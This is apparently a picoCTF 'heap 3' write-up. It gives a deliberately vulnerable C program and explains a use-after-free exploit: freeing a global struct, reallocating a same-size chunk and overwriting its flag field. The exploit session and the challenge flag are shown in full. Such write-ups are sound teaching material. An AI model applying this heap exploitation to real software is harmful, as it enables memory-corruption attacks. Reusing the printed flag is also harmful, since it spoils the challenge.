# heap 3:Binary Exploitation:200pts
This program mishandles memory. Can you exploit it to get the flag?  
Download the binary [here](chall).  
Download the source [here](chall.c).  
Connect with the challenge instance here:  
`nc tethys.picoctf.net 63226`  

Hints  
Check out "use after free"  

# Solution
The binary, source and destination are passed. The source was as follows.  
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

// Create struct
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

int num_allocs;
object *x;

void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
  // Call function in struct
}

void print_menu() {
    printf("\n1. Print Heap\n2. Allocate object\n3. Print x->flag\n4. Check for win\n5. Free x\n6. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

// Create a struct
void init() {

    printf("\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n");
    fflush(stdout);

    x = malloc(sizeof(object));
    strncpy(x->flag, "bico", 5);
}

void alloc_object() {
    printf("Size of object allocation: ");
    fflush(stdout);
    int size = 0;
    scanf("%d", &size);
    char* alloc = malloc(size);
    printf("Data for flag: ");
    fflush(stdout);
    scanf("%s", alloc);
}

void free_memory() {
    free(x);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x->flag, x->flag);
    printf("+-------------+-----------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            alloc_object();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x->flag);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            free_memory();
            break;
        case 6:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```
You can easily call 'check_win' with Check for win, but the 'x->flag' must match the string 'pico'. 
'x->flag' is set to the string 'bico' in 'init'. 
In addition, there is a function to write data by 'mallocing' an arbitrary size with Allocate object, and 'free' 'x' with Free x. 
However, 'x' cannot be rewritten because 'malloc' allocates memory in a different location than 'x'. 
Here, notice that 'x' is defined globally and can be accessed from 'check_win' even if you perform an operation such as 'free'. 
In other words, once 'x' is 'free' and 'malloc' up to 0x28 of the same chunk size, the original 'x' area in tcachebins can be reacquired and rewritten. 
Successfully rewrite the location of 'x->flag' as follows.  
```bash
$ nc tethys.picoctf.net 63226

freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 5

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 2
Size of object allocation: 40
Data for flag: SATOKISATOKISATOKISATOKISATOKIpico

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 3


x = pico


1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 4
YOU WIN!!11!!
picoCTF{now_thats_free_real_estate_a7381726}
```
Check for win got a flag.  

## picoCTF{now_thats_free_real_estate_a7381726}